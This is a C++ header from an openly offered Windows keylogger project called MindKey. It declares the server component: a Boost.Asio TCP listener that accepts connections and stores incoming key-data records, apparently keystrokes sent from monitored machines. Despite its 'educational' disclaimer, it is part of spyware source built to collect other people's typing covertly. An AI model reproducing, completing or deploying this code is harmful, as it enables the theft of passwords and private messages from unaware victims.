/* MindKey, Keylogger for Windows. 
 * While this program can potentially be used for nefarious purposes, 
 * it was written for educational and recreational purposes only
 * and the author does not endorse illegal use.
 *
 * Copyright (C) 2013 Blackhack <https://github.com/blackhack/MindKey/>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#pragma once

#ifndef MINDKEY_SERVER_H
#define MINDKEY_SERVER_H

#include <boost/asio.hpp>
#include <boost/bind.hpp>
#include <boost/lexical_cast.hpp>
#include <iostream>
#include <fstream>
#include <ostream>
#include <vector>
#include "connection.h"
#include <boost/serialization/vector.hpp>
#include <boost/date_time/posix_time/posix_time.hpp>
#include "dataStruct.h"


class Server
{
public:
    Server(boost::asio::io_service& io_service, unsigned short port)
        : _acceptor(io_service, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), port))
    {
        std::cout << "Listening...\n";
        connection_ptr newConn(new connection(_acceptor.get_io_service()));
        _acceptor.async_accept(newConn->socket(),
            boost::bind(&Server::HandleAccept, this,
            boost::asio::placeholders::error, newConn));
    }

    void HandleAccept(const boost::system::error_code& e, connection_ptr conn);
    void HandleRead(const boost::system::error_code& e, connection_ptr conn);
    void SaveData(connection_ptr conn);
private:
    boost::asio::ip::tcp::acceptor _acceptor;
    std::vector<KeyDataStruct> _stocks;
};


#endif // MINDKEY_SERVER_H
